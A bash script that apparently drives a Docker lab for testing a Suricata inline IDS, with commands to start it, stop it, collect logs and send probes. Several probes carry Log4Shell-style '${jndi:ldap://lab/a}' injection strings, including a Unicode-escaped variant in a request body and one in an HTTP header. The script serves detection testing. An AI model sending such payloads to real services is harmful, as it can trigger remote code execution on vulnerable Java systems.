#!/usr/bin/env bash
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
LAB_DIR="$(cd "$SCRIPT_DIR/../assets/docker-suricata-inline-lab" && pwd)"
COMPOSE="docker compose -f $LAB_DIR/docker-compose.yml"

usage() {
  cat <<'EOF'
Usage:
  docker_suricata_inline_lab.sh up
  docker_suricata_inline_lab.sh down
  docker_suricata_inline_lab.sh probe <output_dir>
  docker_suricata_inline_lab.sh logs <output_dir>
EOF
}

run_probe() {
  local name="$1"
  local cmd="$2"
  local out_dir="$3"
  local body="$out_dir/$name.body"
  local err="$out_dir/$name.err"
  local meta="$out_dir/$name.meta"
  local rc=0
  $COMPOSE exec -T client sh -lc "$cmd" >"$body" 2>"$err" || rc=$?
  printf 'rc=%s\n' "$rc" >"$meta"
}

wait_ready() {
  local tries=0
  while [[ $tries -lt 10 ]]; do
    if $COMPOSE exec -T client sh -lc "curl -sS --connect-timeout 1 --max-time 2 http://172.30.20.10:8080/ok >/dev/null" >/dev/null 2>&1; then
      return 0
    fi
    tries=$((tries + 1))
    sleep 1
  done
  return 1
}

cmd="${1:-}"
case "$cmd" in
  up)
    mkdir -p "$LAB_DIR/sensor-logs"
    $COMPOSE up -d --build --remove-orphans
    ;;
  down)
    $COMPOSE down -v
    ;;
  logs)
    out_dir="${2:-}"
    if [[ -z "$out_dir" ]]; then
      usage
      exit 1
    fi
    mkdir -p "$out_dir"
    $COMPOSE exec -T sensor sh -lc 'cat /var/log/suricata/eve.json' >"$out_dir/eve.json"
    $COMPOSE logs --no-color >"$out_dir/compose.log"
    ;;
  probe)
    out_dir="${2:-}"
    if [[ -z "$out_dir" ]]; then
      usage
      exit 1
    fi
    mkdir -p "$out_dir"
    wait_ready
    run_probe "get_ok" "curl -sS --connect-timeout 2 --max-time 5 http://172.30.20.10:8080/ok" "$out_dir"
    run_probe "get_blocked" "curl -sS --connect-timeout 2 --max-time 5 http://172.30.20.10:8080/blocked" "$out_dir"
    run_probe "post_benign" "curl -sS --connect-timeout 2 --max-time 5 -X POST http://172.30.20.10:8080/echo -H 'Content-Type: application/json' --data '{\"msg\":\"hello\"}'" "$out_dir"
    run_probe "post_jndi_body" "curl -sS --connect-timeout 2 --max-time 5 -X POST http://172.30.20.10:8080/echo -H 'Content-Type: application/json' --data '{\"msg\":\"\${jndi:ldap://lab/a}\"}'" "$out_dir"
    run_probe "post_unicode_body" "printf '%s' '{\"msg\":\"\\u0024\\u007bjndi:ldap://lab/a}\"}' | curl -sS --connect-timeout 2 --max-time 5 -X POST http://172.30.20.10:8080/echo -H 'Content-Type: application/json' --data-binary @-" "$out_dir"
    run_probe "header_jndi" "curl -sS --connect-timeout 2 --max-time 5 http://172.30.20.10:8080/ok -H 'X-Test: \${jndi:ldap://lab/a}'" "$out_dir"
    $COMPOSE exec -T sensor sh -lc 'cat /var/log/suricata/eve.json' >"$out_dir/eve.json"
    ;;
  *)
    usage
    exit 1
    ;;
esac
